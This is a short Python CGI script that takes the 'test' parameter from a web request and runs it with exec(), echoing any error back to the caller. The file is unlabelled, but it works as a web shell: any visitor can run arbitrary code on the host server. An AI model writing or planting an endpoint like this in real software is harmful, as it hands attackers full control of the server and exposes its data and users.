#!/usr/bin/python3
# -*- coding: utf-8 -*

import cgi
import sys
form =cgi.FieldStorage()
tee=form.getvalue('test')
print("Content-type: text/html;image/jpeg; charset=utf-8\n")
try:
  exec(tee)
except:
  print(sys.exc_info())

#print(tee)

